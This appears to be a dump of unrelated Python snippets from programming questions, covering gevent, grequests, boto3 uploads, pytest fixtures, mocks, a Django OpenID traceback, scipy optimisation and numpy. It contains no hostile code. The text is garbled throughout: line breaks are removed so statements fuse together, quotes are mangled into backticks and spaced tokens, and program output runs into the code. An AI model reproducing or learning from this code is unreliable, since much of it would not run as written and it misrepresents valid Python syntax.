from gevent import monkey ; monkey.patch_all ( ) import geventfrom gevent.pool import Groupfrom gevent.queue import JoinableQueueimport redistasks = JoinableQueue ( ) task_group = Group ( ) def crawler ( ) : while True : if not tasks.empty ( ) : print tasks.get ( ) gevent.sleep ( ) task_group.spawn ( crawler ) redis_client = redis.Redis ( ) data = redis_client.lpop ( 'test ' ) # < -- -- -- -- -- Block heretasks.put ( data )
"import timeimport sysimport grequestsimport geventdef cb ( res , **kwargs ) : print ( `` **** Response '' , time.time ( ) , len ( res.text ) ) for i in range ( 10 ) : unsent = grequests.get ( sys.argv [ 1 ] , hooks= { 'response ' : cb } ) print ( `` Request '' , time.time ( ) ) grequests.send ( unsent , grequests.Pool ( 1 ) ) gevent.sleep ( 0.2 ) gevent.sleep ( 5 ) ( 'Request ' , 1459050191.499266 ) ( 'Request ' , 1459050191.701466 ) ( 'Request ' , 1459050191.903223 ) ( 'Request ' , 1459050192.10403 ) ( 'Request ' , 1459050192.305626 ) ( '**** Response ' , 1459050192.099185 , 179643 ) ( 'Request ' , 1459050192.506476 ) ( '**** Response ' , 1459050192.307869 , 179643 ) ( 'Request ' , 1459050192.707745 ) ( '**** Response ' , 1459050192.484711 , 179643 ) ( 'Request ' , 1459050192.909376 ) ( '**** Response ' , 1459050192.696583 , 179643 ) ( 'Request ' , 1459050193.110528 ) ( '**** Response ' , 1459050192.870476 , 179643 ) ( 'Request ' , 1459050193.311601 ) ( '**** Response ' , 1459050193.071679 , 179639 ) ( '**** Response ' , 1459050193.313615 , 179680 ) ( '**** Response ' , 1459050193.4959 , 179643 ) ( '**** Response ' , 1459050193.687054 , 179680 ) ( '**** Response ' , 1459050193.902827 , 179639 ) ( 'Request ' , 1459050203.24336 ) ( 'Request ' , 1459050203.44473 ) ( '**** Response ' , 1459050204.423302 , 0 ) ( 'Request ' , 1459050204.424748 ) < -- -- -- -- -- -- - THIS REQUEST TIME IS LATE ( '**** Response ' , 1459050205.294426 , 0 ) ( 'Request ' , 1459050205.296722 ) ( 'Request ' , 1459050205.497924 ) ( '**** Response ' , 1459050206.456572 , 0 ) ( 'Request ' , 1459050206.457875 ) ( '**** Response ' , 1459050207.363188 , 0 ) ( '**** Response ' , 1459050208.247189 , 0 ) ( 'Request ' , 1459050208.249579 ) ( '**** Response ' , 1459050208.250645 , 179643 ) ( '**** Response ' , 1459050208.253638 , 179643 ) ( 'Request ' , 1459050208.451083 ) ( '**** Response ' , 1459050209.426556 , 0 ) ( 'Request ' , 1459050209.428032 ) ( '**** Response ' , 1459050209.428929 , 179643 ) ( '**** Response ' , 1459050210.331425 , 0 ) ( '**** Response ' , 1459050211.247793 , 0 ) ( 'Request ' , 1459050211.251574 ) ( '**** Response ' , 1459050211.252321 , 179643 ) ( '**** Response ' , 1459050211.25519 , 179680 ) ( '**** Response ' , 1459050212.397186 , 0 ) ( '**** Response ' , 1459050213.299109 , 0 ) ( '**** Response ' , 1459050213.588854 , 179588 ) ( '**** Response ' , 1459050213.590434 , 179643 ) ( '**** Response ' , 1459050213.593731 , 179643 ) ( '**** Response ' , 1459050213.90507 , 179643 ) ( '**** Response ' , 1459050213.909386 , 179643 )"
"timeList = [ ( ' 4 ' , '12 ' , 'PM ' ) , ( ' 8 ' , '23 ' , 'PM ' ) , ( ' 4 ' , '03 ' , 'AM ' ) , ( ' 1 ' , '34 ' , 'AM ' ) , ( '12 ' , '48 ' , 'PM ' ) , ( ' 4 ' , '13 ' , 'AM ' ) , ( '11 ' , '09 ' , 'AM ' ) , ( ' 3 ' , '12 ' , 'PM ' ) , ( ' 4 ' , '10 ' , 'PM ' ) ]"
c = 10f ( ) + g ( ) + c
"EN_EXTRACT_REGEX = ' ( [ a-zA-Z ] + ) 'NUM_EXTRACT_REGEX = ' ( [ 0-9 ] + ) 'AGGR_REGEX = EN_EXTRACT_REGEX + '| ' + NUM_EXTRACT_REGEXentry = re.sub ( AGGR_REGEX , r ' \1\2 ' , entry )"
"> > > tmp = l [ 0 ] > > > l [ 0 ] = float ( '-inf ' ) > > > l.sort ( ) > > > l [ 0 ] = tmp > > > l [ 2 , 1 , 3 , 4 , 5 ]"
"import requestsfileobj = requests.get ( url , stream=True ) import boto3s3 = boto3.resource ( 's3 ' ) s3.bucket ( 'my-bucket ' ) .upload_fileobj ( fileobj , 'target-file-name ' ) s3.bucket ( 'my-bucket ' ) .upload_fileobj ( fileobj , 'target-file-name ' ) # At the same time somehow asprocess = subprocess.Popen ( [ 'myapp ' ] , stdin=fileobj ) class MyFilewrapper ( object ) : def __init__ ( self , fileobj ) : self._fileobj = fileobj self._process = subprocess.Popen ( [ 'myapp ' ] , stdin=popen.PIPE ) def read ( self , size=-1 ) : data = self._fileobj.read ( size ) self._process.stdin.write ( data ) return datafilewrapper = MyFilewrapper ( fileobj ) s3.bucket ( 'my-bucket ' ) .upload_fileobj ( filewrapper , 'target-file-name ' ) streams = StreamDuplicator ( fileobj , streams=2 ) s3.bucket ( 'my-bucket ' ) .upload_fileobj ( streams [ 0 ] , 'target-file-name ' ) # At the same time somehow asprocess = subprocess.Popen ( [ 'myapp ' ] , stdin=streams [ 1 ] )"
"`` hello world '' '' 11hello world '' '' 66645world hello '' `` Hello world '' '' 11Hello world '' '' 66645World hello '' with open ( 'input.txt ' ) as input , open ( `` output.txt '' , `` a '' ) as output : for line in input : output.write ( line [ 0:1 ] .upper ( ) +line [ 1 : -1 ] .lower ( ) + '' \n '' )"
"random.choices ( population , weights=None , * , cum_weights=None , k=1 )"
"zip [ 1.. ] `` abcdefghijklmnop '' [ ( 1 , ' a ' ) , ( 2 , ' b ' ) , ( 3 , ' c ' ) , ( 4 , 'd ' ) , ( 5 , ' e ' ) , ( 6 , ' f ' ) , ( 7 , ' g ' ) , ( 8 , ' h ' ) , ( 9 , ' i ' ) , ( 10 , ' j ' ) , ( 11 , ' k ' ) , ( 12 , ' l ' ) , ( 13 , 'm ' ) , ( 14 , ' n ' ) , ( 15 , ' o ' ) , ( 16 , ' p ' ) ] s = `` abcdefghijklmnop '' indexedlist = [ ] for i , c in enumerate ( s ) : indexedlist.append ( ( i , c ) ) > > > indexedlist [ ( 0 , ' a ' ) , ( 1 , ' b ' ) , ( 2 , ' c ' ) , ( 3 , 'd ' ) , ( 4 , ' e ' ) , ( 5 , ' f ' ) , ( 6 , ' g ' ) , ( 7 , ' h ' ) , ( 8 , ' i ' ) , ( 9 , ' j ' ) , ( 10 , ' k ' ) , ( 11 , ' l ' ) , ( 12 , 'm ' ) , ( 13 , ' n ' ) , ( 14 , ' o ' ) , ( 15 , ' p ' ) ]"
main.pypkg1 : __init__.py util.pypkg2 : __init__.py test.py
"def foo ( a , b ) - > str : # Nothing gets properly colored from here # A bunch of code… return `` bar '' < key > end < /key > < string > ( \ ) ) \s* ( ? : ( \ : ) | ( .* $ \n ? ) ) < /string > < key > end < /key > < string > ( \ ) ) \s* ( ? : \- > \s* [ A-Za-z_ ] [ A-Za-z0-9_ ] *\s* ) ? ( ? : ( \ : ) | ( .* $ \n ? ) ) < /string >"
"> > > a = { 'req_params ' : { 'app ' : '12345 ' , 'format ' : 'json ' } , 'url_params ' : { 'namespace ' : 'foo ' , 'id ' : 'baar ' } , 'url_id ' : 'rest ' } > > > b = { 'req_params ' : { 'format ' : 'json ' , 'app ' : '12345 ' } , 'url_params ' : { 'id ' : 'baar ' , 'namespace ' : 'foo ' } , 'url_id ' : 'REST'.lower ( ) } > > > a == b True > > > a = { 'name ' : 'Jon ' , 'class ' : 'nine ' } > > > b = { 'class ' : 'NINE'.lower ( ) , 'name ' : 'Jon ' } > > > str ( a ) '' { 'name ' : 'Jon ' , 'class ' : 'nine ' } '' > > > str ( b ) '' { 'class ' : 'nine ' , 'name ' : 'Jon ' } '' > > > import json , hashlib > > > a = { 'name ' : 'Jon ' , 'class ' : 'nine ' } > > > b = { 'class ' : 'NINE'.lower ( ) , 'name ' : 'Jon ' } > > > a == bTrue > > > ha = hashlib.sha256 ( json.dumps ( a ) ) .hexdigest ( ) > > > hb = hashlib.sha256 ( json.dumps ( b ) ) .hexdigest ( ) > > > ha'545af862cc4d2dd1926fe0aa1e34ad5c3e8a319461941b33a47a4de9dbd7b5e3 ' > > > hb '4c7d8dbbe1f180c7367426d631410a175d47fff329d2494d80a650dde7bed5cb '"
"import pytestruncounter = 0 @ pytest.fixture ( scope= '' session '' , params= [ 1e-8 , 1e-11 ] ) def tolerance ( request ) : `` '' '' Precision in floating point compare . '' '' '' return request.param @ pytest.fixture ( scope='session ' , params= [ 1 , 2 ] ) def paramfixture ( request ) : return request.param @ pytest.fixture ( scope= '' session '' ) def expected_result ( paramfixture ) : return 1 + paramfixture @ pytest.fixture ( scope='session ' ) def run_result ( paramfixture ) : global runcounter runcounter = runcounter + 1 print `` Run # '' , runcounter , 'param : ' , paramfixture return 1 + paramfixturedef test_run_result ( run_result , expected_result , tolerance ) : print `` run_result : % d , expected_result : % d '' % ( run_result , expected_result ) assert abs ( run_result - expected_result ) < tolerance $ py.test -vs test/end2end/test_temp.py===================================================== test session starts ======================================================platform linux2 -- Python 2.7.11 , pytest-2.9.1 , py-1.4.31 , pluggy-0.3.1 -- /home/f557010/.conda/envs/sfpdev/bin/pythoncachedir : .cacherootdir : /home/f557010/svndev/SFP , inifile : pytest.inicollected 4 itemstest/end2end/test_temp.py : :test_run_result [ 1e-08-1 ] Run # 1 param : 1run_result : 2 , expected_result : 2PASSEDtest/end2end/test_temp.py : :test_run_result [ 1e-08-2 ] Run # 2 param : 2run_result : 3 , expected_result : 3PASSEDtest/end2end/test_temp.py : :test_run_result [ 1e-11-2 ] run_result : 3 , expected_result : 3PASSEDtest/end2end/test_temp.py : :test_run_result [ 1e-11-1 ] Run # 3 param : 1run_result : 2 , expected_result : 2PASSED=================================================== 4 passed in 0.01 seconds ==================================================="
expression_string = 'ColumnName < ( -1000 ) 'output_dataframe = dataframe.query ( expression_string ) AttributeError : 'UnaryOp ' object has no attribute 'value '
"df = pd.DataFrame ( { ' a ' : [ 1,1,0,0 ] , ' b ' : [ 0,1,1,0 ] , ' c ' : [ 0,0,1,1 ] } ) a b ca 2 1 0b 1 2 1c 0 1 2 matrix = [ ] for name , values in df.iteritems ( ) : matrix.append ( pd.DataFrame ( df.groupby ( name , as_index=False ) .apply ( lambda x : x [ x == 1 ] .count ( ) ) ) .values.tolist ( ) [ 1 ] ) pd.DataFrame ( matrix )"
"x = [ 0 , -1 , 0 , 3 ] y = [ [ 0 , -2 , 0 , 2 ] , [ 0 , -1 , 0 , 3 ] , [ 0 , 0 , 0 , 4 ] ] y=np.vstack ( x-1 , x , x+1 ) y [ 0 ] [ : :2 ] = 0y [ 1 ] [ : :2 ] = 0y [ 2 ] [ : :2 ] = 0"
"# ! /usr/bin/env python # -*- coding : UTF-8 -*- '' '' '' A little script to demonstrate that a function wo n't re-initialize itslist parameters between calls , but instead allows them to retain state . `` `` '' def bleedscope ( a= [ ] , b= [ ] ) : `` '' '' On each call , unless explicitly passed , both ` a ` and ` b ` should be initialized as empty lists. `` '' '' c = a if b : c.extend ( b ) return len ( c ) x = bleedscope ( b= [ 1 ] ) print x # Should be 1 , as expected.x = bleedscope ( b= [ 2 ] ) print x # Expect also to be 1 , but it 's 2 . ` a ` is retained.x = bleedscope ( a= [ 1 ] ) print x # Now 1 as expected.x = bleedscope ( b= [ 3 ] ) print x # 1 as expected ? No , it 's 3 ! Insanity !"
"from os import listdirfrom config.ConfigB import ConfigBclass FileRunner ( object ) : def runProcess ( self , cfgA ) cfgB = ConfigB ( cfgA ) print ( listdir ( ) ) import unittestimport unittest.mock imort MagicMockimport mockfrom FileRunner import FileRunnerclass TestFileRunner ( unittest.TestCase ) : @ mock.patch ( 'ConfigB.ConfigB.__init__ ' ) @ mock.patch ( 'os.listdir ' ) def test_methodscalled ( self , osListDir , cfgB ) : cfgA = MagicMock ( ) fileRunner = FileRunner ( ) cfgB.return_value = None osListDir.return_value = None fileRunner.runProcess ( cfgA )"
class Salad : ... class Vegetable : salad = models.ForeignKey ( Salad ) ... class Cucumber ( Vegetable ) : ... class Carrot ( Vegetable ) : ...
> > > class What : ... def meth ( self ) : ... pass > > > What.meth is What.methTrue > > > inst = What ( ) > > > inst.meth is inst.methFalse > > > def func ( ) : pass > > > func is funcTrue
"self.root = Tk ( ) self.W , self.H = self.root.winfo_screenwidth ( ) , self.root.winfo_screenheight ( ) self.root.overrideredirect ( 1 ) # full screen , no menu or bordersself.root.geometry ( `` % dx % d+0+0 '' % ( self.W , self.H ) ) file = tkinter.filedialog.askopenfilename ( parent=self.root ) # UNDER main window"
"import numpy as npimport cv2print ( 'OpenCV should be at least 3.4.2 to test : ' , cv2.__version__ ) image = np.eye ( 10 , dtype='uint8 ' ) lines = cv2.HoughLines ( image , 1 , np.pi/180 , 5 ) print ( ' ( number of lines , 1 , output vector dimension ) : ' , lines.shape ) print ( lines ) OpenCV should be at least 3.4.2 to test : 3.4.2 ( number of lines , 1 , output vector dimension ) : ( 3 , 1 , 2 ) [ [ [ 0 . 2.3212879 ] ] [ [ 1 . 2.2340214 ] ] [ [ -1 . 2.4609141 ] ] ]"
"try : path_list = env.get ( 'PATH ' ) except TypeError : path_list = Noneif supports_bytes_environ : try : path_listb = env [ b'PATH ' ] except ( KeyError , TypeError ) : pass else : if path_list is not None : raise ValueError ( `` env can not contain 'PATH ' and b'PATH ' keys '' ) path_list = path_listb if path_list is not None and isinstance ( path_list , bytes ) : path_list = fsdecode ( path_list )"
"Environment : Request Method : GETRequest URL : http : //localhost:7777/google/login/Django Version : 1.6Python Version : 2.7.3Installed Applications : ( 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.sites ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'django.contrib.admin ' , 'meet ' , 'django_openid_auth ' , 'django_jenkins ' ) Installed Middleware : ( 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.middleware.locale.LocaleMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'meet.middlewares.TimezoneMiddleware ' ) Traceback : File `` /usr/local/lib/python2.7/dist-packages/django/core/handlers/base.py '' in get_response 201. response = middleware_method ( request , response ) File `` /usr/local/lib/python2.7/dist-packages/django/contrib/sessions/middleware.py '' in process_response 38. request.session.save ( ) File `` /usr/local/lib/python2.7/dist-packages/django/contrib/sessions/backends/db.py '' in save 57. session_data=self.encode ( self._get_session ( no_load=must_create ) ) , File `` /usr/local/lib/python2.7/dist-packages/django/contrib/sessions/backends/base.py '' in encode 87. serialized = self.serializer ( ) .dumps ( session_dict ) File `` /usr/local/lib/python2.7/dist-packages/django/core/signing.py '' in dumps 88. return json.dumps ( obj , separators= ( ' , ' , ' : ' ) ) .encode ( 'latin-1 ' ) File `` /usr/lib/python2.7/json/__init__.py '' in dumps 238 . **kw ) .encode ( obj ) File `` /usr/lib/python2.7/json/encoder.py '' in encode 201. chunks = self.iterencode ( o , _one_shot=True ) File `` /usr/lib/python2.7/json/encoder.py '' in iterencode 264. return _iterencode ( o , 0 ) File `` /usr/lib/python2.7/json/encoder.py '' in default 178. raise TypeError ( repr ( o ) + `` is not JSON serializable '' ) Exception Type : TypeError at /google/login/Exception Value : < openid.yadis.manager.YadisServiceManager object at 0x7fd2f43b2250 > is not JSON serializable from django.contrib.auth.models import Userfrom openid.consumer.consumer import SUCCESSfrom django.core.mail import mail_adminsclass GoogleBackend : def authenticate ( self , openid_response ) : if openid_response is None : return None if openid_response.status ! = SUCCESS : return None google_email = openid_response.getSigned ( 'http : //openid.net/srv/ax/1.0 ' , 'value.email ' ) google_firstname = openid_response.getSigned ( 'http : //openid.net/srv/ax/1.0 ' , 'value.firstname ' ) google_lastname = openid_response.getSigned ( 'http : //openid.net/srv/ax/1.0 ' , 'value.lastname ' ) try : # user = User.objects.get ( username=google_email ) # Make sure that the e-mail is unique . user = User.objects.get ( email=google_email ) if user.first_name == u '' : user.first_name = google_firstname if user.last_name == u '' : user.last_name = google_lastname except User.DoesNotExist : user = User.objects.create_user ( google_email , google_email , 'password ' ) user.first_name = google_firstname user.last_name = google_lastname user.save ( ) user = User.objects.get ( username=google_email ) return user return user def get_user ( self , user_id ) : try : return User.objects.get ( pk=user_id ) except User.DoesNotExist : return None url ( r'^google/login/ $ ' , 'django_openid_auth.views.login_begin ' , name='openid-login ' ) , url ( r'^google/login-complete/ $ ' , 'django_openid_auth.views.login_complete ' , name='openid-complete ' ) ,"
"> > > { 'foo ' : 'bar ' } .gte ( 'foo ' ) # well , I meant “ get ” ! > > > offending_object = get_attributeerror_obj ( sys.last_traceback ) > > > dir ( offending_object ) [ ... 'clear ' , 'copy ' , 'fromkeys ' , 'get ' , # ah , here it is ! 'items ' , ... ] import sysimport reimport difflibAE_MSG_RE = re.compile ( r '' ' ( \w+ ) ' object has no attribute ' ( \w+ ) ' '' ) def get_attributeerror_obj ( tb ) : ? ? ? old_hook = sys.excepthookdef did_you_mean_hook ( type , exc , tb ) : old_hook ( type , exc , tb ) if type is AttributeError : match = AE_MSG_RE.match ( exc.args [ 0 ] ) sook = match.group ( 2 ) raising_obj = get_attributeerror_obj ( tb ) matches = difflib.get_close_matches ( sook , dir ( raising_obj ) ) if matches : print ( '\n\nDid you mean ? ' , matches [ 0 ] , file=sys.stderr ) sys.excepthook = did_you_mean_hook"
"class A : def __init__ ( self , b ) : self.a = 123 self.b = b print `` a is { } '' .format ( self.a ) def __del__ ( self ) : self.a = -1 print `` a is { } '' .format ( self.a ) self.b.dont_gc_me = self def foo ( self ) : self.a = 9999999 print `` a is { } '' .format ( self.a ) class Foo : def __init__ ( self ) : self.a = 800 def __del__ ( self ) : self.a = 0 In [ 92 ] : f = Foo ( ) In [ 93 ] : a = A ( f ) a is 123In [ 94 ] : a = Nonea is -1In [ 95 ] : f.__dict__Out [ 95 ] : { ' a ' : 800 , 'dont_gc_me ' : < __main__.A instance at 0x2456830 > } In [ 96 ] : f = NoneIn [ 97 ] :"
"from fabric.api import envdef env_localhost ( ) : `` All the environment variables relating to your localhost '' project_home = local ( 'echo $ PROJECT_HOME ' ) print 111 , project_home"
"# assuming outputs from a.proto and b.proto , where b depends on aimport protobufs.aimport protobufs.b syntax = `` proto3 '' ; import `` common.proto '' ; # Generated by the protocol buffer compiler . DO NOT EDIT ! # source : persons.protoimport sys_b=sys.version_info [ 0 ] < 3 and ( lambda x : x ) or ( lambda x : x.encode ( 'latin1 ' ) ) from google.protobuf.internal import enum_type_wrapperfrom google.protobuf import descriptor as _descriptorfrom google.protobuf import message as _messagefrom google.protobuf import reflection as _reflectionfrom google.protobuf import symbol_database as _symbol_databasefrom google.protobuf import descriptor_pb2 # @ @ protoc_insertion_point ( imports ) _sym_db = _symbol_database.Default ( ) import common_pb2 as common__pb2"
dyld : Library not loaded : @ executable_path/../.Python Referenced from : /usr/local/Cellar/aws-sam-cli/0.53.0/libexec/bin/python3.7 Reason : image not found drwxr-xr-x 7 RCR staff 224 Jun 16 19:40 .drwxr-xr-x 9 RCR staff 288 Jul 8 14:55 ..lrwxr-xr-x 1 RCR staff 70 Jun 16 19:40 .Python - > ../../../../opt/python/Frameworks/Python.framework/Versions/3.7/Pythondrwxr-xr-x 39 RCR staff 1248 Jul 8 14:55 bindrwxr-xr-x 3 RCR staff 96 Jun 16 19:40 includedrwxr-xr-x 3 RCR staff 96 Jun 16 19:40 lib-rw-r -- r -- 1 RCR staff 61 Jun 16 19:40 pip-selfcheck.json
"m1lenhr m1lenmin m1citywt m1a12a cm1age cm1numb m1b1a m1b1b m1b12a m1b12b ... kind_attention_scale_10 kind_attention_scale_22 kind_attention_scale_21 kind_attention_scale_15 kind_attention_scale_18 kind_attention_scale_19 kind_attention_scale_25 kind_attention_scale_24 kind_attention_scale_27 kind_attention_scale_23challengeID 1 0.130765 40.0 202.485367 1.893256 27.0 1.0 2.0 0.0 2.254198 2.289966 ... 0 0 0 0 0 0 0 0 0 02 0.000000 40.0 45.608219 1.000000 24.0 1.0 2.0 0.0 2.000000 3.000000 ... 0 0 0 0 0 0 0 0 0 03 0.000000 35.0 39.060299 2.000000 23.0 1.0 2.0 0.0 2.254198 2.289966 ... 0 0 0 0 0 0 0 0 0 04 0.000000 30.0 22.304855 1.893256 22.0 1.0 3.0 0.0 2.000000 3.000000 ... 0 0 0 0 0 0 0 0 0 05 0.000000 25.0 35.518272 1.893256 19.0 1.0 1.0 6.0 1.000000 3.000000 ... 0 x = [ 40.0 , 40.0 , 35.0 , 30.0 , 25.0 ] find_column ( x )"
"> > > from mock import mock_open > > > m = mock_open ( ) > > > with patch ( '__main__.open ' , m , create=True ) : ... with open ( 'foo ' , ' w ' ) as h : ... h.write ( 'some stuff ' ) ... > > > m.mock_calls [ call ( 'foo ' , ' w ' ) , call ( ) .__enter__ ( ) , call ( ) .write ( 'some stuff ' ) , call ( ) .__exit__ ( None , None , None ) ] > > > m.assert_called_once_with ( 'foo ' , ' w ' ) > > > handle = m ( ) > > > handle.write.assert_called_once_with ( 'some stuff ' ) > > > expected = 'some stuff ' > > > assert ( expected == m.all_that_was_written ) E AssertionError : [ call ( 'Tool_000.json ' , ' w ' ) , call ( ) .__enter__ ( ) , call ( ) .write ( ' [ ' ) , call ( ) .write ( '\n ' ) , call ( ) .write ( ' '' 1.0.0 '' ' ) , call ( ) .write ( ' , \n ' ) , call ( ) .write ( ' '' 2014-02-27 08:58:02 '' ' ) , call ( ) .write ( ' , \n ' ) , call ( ) .write ( ' '' ook '' ' ) , call ( ) .write ( '\n ' ) , call ( ) .write ( ' ] ' ) , call ( ) .__exit__ ( None , None , None ) ] ! = [ call ( 'Tool_000.json ' , ' w ' ) , call ( ) .__enter__ ( ) , call ( ) .write ( ' [ \n `` 1.0.0 '' ' ) , call ( ) .write ( ' , \n `` 2014-02-27 08:58:02 '' ' ) , call ( ) .write ( ' , \n `` ook '' ' ) , call ( ) .write ( '\n ' ) , call ( ) .write ( ' ] ' ) , call ( ) .__exit__ ( None , None , None ) ] with open ( get_new_file_name ( ) , ' w ' ) as fp : json.dump ( lst , fp )"
"In [ 1 ] : a1 = np.array ( [ 1,2,3,4,5,6,7 ] ) In [ 2 ] : x = np.array ( [ 10,11,12 ] ) In [ 3 ] : ind = np.array ( [ 2,4,5 ] ) In [ 4 ] : a2 = np.copy ( a1 ) In [ 5 ] : a2.put ( ind , x ) In [ 6 ] : a2Out [ 6 ] : array ( [ 1 , 2 , 10 , 4 , 11 , 12 , 7 ] ) a2 = np.replace ( a1 , ind , x ) def somefunction ( a ) : ... .costfun = lambda x : somefunction ( np.replace ( a1 , ind , x ) ) def replace ( a1 , ind , x ) : a2 = np.copy ( a1 ) a2.put ( ind , x ) return ( a2 )"
"P = np.array ( [ 3,4,5 ] ) N = np.array ( [ 1,2,1 ] ) m = 50sum ( P*N ) > m cons_c = [ { 'type ' : 'ineq ' , 'fun ' : lambda N : 10 - sum ( np.round ( N ) *P ) } , { 'type ' : 'ineq ' , 'fun ' : lambda N : 24 - sum ( N*T ) } ] bnds = [ ( 0. , None ) for x in range ( len ( N ) ) ] optimized_c = scipy.optimize.minimize ( utility_c , N , ( P , Q , T ) , method='SLSQP ' , bounds=bnds , constraints=cons_c ) def utility_c ( N , P , Q , T ) : print `` N : { 0 } '' .format ( N ) print `` P : { 0 } '' .format ( P ) print `` Q : { 0 } '' .format ( Q ) print `` T : { 0 } '' .format ( T ) N = np.round ( N ) m = 10 - sum ( N*P ) b = sum ( N*Q ) t = 24 - sum ( N*T ) print `` m in C : { 0 } '' .format ( m ) print `` b : { 0 } '' .format ( b ) print `` t : { 0 } '' .format ( t ) # if m < 0 or t < 0 : # return 0 return 1/ ( ( b**0.3 ) * ( t**0.7 ) ) + ( 5* ( m**0.5 ) ) N : [ 1 . 1 . 1 . ] P : [ 5 . 14 . 4 . ] Q : [ 1 . 3 . 1 . ] T : [ 1 . 1 . 1.01 ] m in C : -13.0 cons_c = [ { 'type ' : 'ineq ' , 'fun ' : lambda N , P : 10 - sum ( np.round ( N ) *P ) , 'args ' : P } , { 'type ' : 'ineq ' , 'fun ' : lambda N : 24 - sum ( N*T ) } ] import scipy.optimizeimport numpy as npimport sysdef solve_utility ( P , Q , T ) : `` '' '' Here we are given the pricing already ( P , Q , T ) , but solve for the quantities each type would purchase in order to maximize their utility ( N ) . `` '' '' def utility_a ( N , P , Q , T ) : N = np.round ( N ) m = 50 - sum ( N*P ) b = sum ( N*Q ) t = 8 - sum ( N*T ) return 1/ ( ( b**0.5 ) * ( t**0.5 ) ) + ( 5* ( m**0.5 ) ) def utility_b ( N , P , Q , T ) : N = np.round ( N ) m = 50 - sum ( N*P ) b = sum ( N*Q ) t = 8 - sum ( N*T ) return 1/ ( ( b**0.7 ) * ( t**0.3 ) ) + ( 5* ( m**0.5 ) ) def utility_c ( N , P , Q , T ) : N = np.round ( N ) print `` N : { 0 } '' .format ( N ) print `` P : { 0 } '' .format ( P ) print `` Q : { 0 } '' .format ( Q ) print `` T : { 0 } '' .format ( T ) m = 10 - sum ( N*P ) b = sum ( N*Q ) t = 24 - sum ( N*T ) print `` m in C : { 0 } '' .format ( m ) print `` b : { 0 } '' .format ( b ) print `` t : { 0 } '' .format ( t ) return 1/ ( ( b**0.3 ) * ( t**0.7 ) ) + ( 5* ( m**0.5 ) ) # Establishing constraints so no negative money or time : N = np.array ( [ 2,2,1 ] ) cons_a = [ { 'type ' : 'ineq ' , 'fun ' : lambda N , P : 50 - sum ( np.round ( N ) *P ) , 'args ' : ( P , ) } , { 'type ' : 'ineq ' , 'fun ' : lambda N : 8 - sum ( N*T ) } ] cons_b = [ { 'type ' : 'ineq ' , 'fun ' : lambda N , P : 50 - sum ( np.round ( N ) *P ) , 'args ' : ( P , ) } , { 'type ' : 'ineq ' , 'fun ' : lambda N : 8 - sum ( N*T ) } ] cons_c = [ { 'type ' : 'ineq ' , 'fun ' : lambda N , P : 10 - sum ( np.round ( N ) *P ) , 'args ' : ( P , ) } , { 'type ' : 'ineq ' , 'fun ' : lambda N : 24 - sum ( N*T ) } ] maxes = P/50 bnds = [ ( 0. , None ) for x in range ( len ( N ) ) ] b = [ ( ) ] optimized_a = scipy.optimize.minimize ( utility_a , N , ( P , Q , T ) , method='SLSQP ' , constraints=cons_a ) optimized_b = scipy.optimize.minimize ( utility_b , N , ( P , Q , T ) , method='SLSQP ' , constraints=cons_b ) optimized_c = scipy.optimize.minimize ( utility_c , N , ( P , Q , T ) , method='SLSQP ' , constraints=cons_c ) if not optimized_a.success : print `` Solving Utilities A did n't work ... '' return None if not optimized_b.success : print `` Solving Utilities B did n't work ... '' return None if not optimized_c.success : print `` Solving Utilities C did n't work ... '' return None else : print `` returning N : { 0 } '' .format ( np.array ( [ optimized_a.x , optimized_b.x , optimized_c.x ] ) ) return np.array ( [ optimized_a.x , optimized_b.x , optimized_c.x ] ) # solve_utility ( P , Q , T , N ) def solve_profits ( ) : `` '' '' Here we build the best pricing strategy to maximize solve_profits `` '' '' P = np.array ( [ 3 , 10.67 , 2.30 ] ) # Pricing Q = np.array ( [ 1 , 4 , 1 ] ) # Quantity of beer for each unit T = np.array ( [ 1 , 1 , 4 ] ) # Time cost per unit N = np.array ( [ 1 , 0 , 1 ] ) # Quantities of unit taken by customer def profit ( X ) : P , Q , T = X [ 0:3 ] , X [ 3:6 ] , X [ 6:9 ] Q [ 1 ] = round ( Q [ 1 ] ) # needs to be an integer N = solve_utility ( P , Q , T ) print `` N : { 0 } '' .format ( N ) N = np.sum ( N , axis=1 ) # print `` P : { 0 } '' .format ( P ) # print `` Q : { 0 } '' .format ( Q ) # print `` T : { 0 } '' .format ( T ) denom = sum ( N*P*Q ) - sum ( Q*N ) return 1/ ( sum ( N*P*Q ) - sum ( Q*N ) ) cons = [ { 'type ' : 'ineq ' , 'fun ' : lambda X : X [ 8 ] - X [ 6 ] - 0.01 } , # The time expense for a coupon must be 0.01 greater than regular { 'type ' : 'ineq ' , 'fun ' : lambda X : X [ 4 ] - 2 } , # Packs must contain at least 2 beers { 'type ' : 'eq ' , 'fun ' : lambda X : X [ 3 ] - 1 } , # Quantity has to be 1 for single beer { 'type ' : 'eq ' , 'fun ' : lambda X : X [ 5 ] - 1 } , # same with coupons { 'type ' : 'ineq ' , 'fun ' : lambda X : X [ 6 ] - 1 } , # Time cost must be at least 1 { 'type ' : 'ineq ' , 'fun ' : lambda X : X [ 7 ] - 1 } , { 'type ' : 'ineq ' , 'fun ' : lambda X : X [ 8 ] - 1 } , ] X = np.concatenate ( [ P , Q , T ] ) optimized = scipy.optimize.minimize ( profit , X , method= ' L-BFGS-B ' , constraints=cons ) if not optimized.success : print `` Solving Profits did n't work ... '' else : return optimized.x , NX , N = solve_profits ( ) print `` X : { 0 } N { 1 } '' .format ( X , N ) P , Q , T = X [ 0:3 ] , X [ 3:6 ] , X [ 6:9 ] rev = sum ( P * Q * N ) cost = sum ( Q * N ) profit = ( rev-cost ) *50print `` N : { 0 } '' .format ( N ) print `` P : { 0 } '' .format ( P ) print `` Q : { 0 } '' .format ( Q ) print `` T : { 0 } '' .format ( T ) print `` profit = { 0 } '' .format ( profit )"
lst = [ 1 ] for i in lst : lst.append ( i+1 ) print ( i ) lst = set ( [ 1 ] ) for i in lst : lst.add ( i+1 ) print ( i )
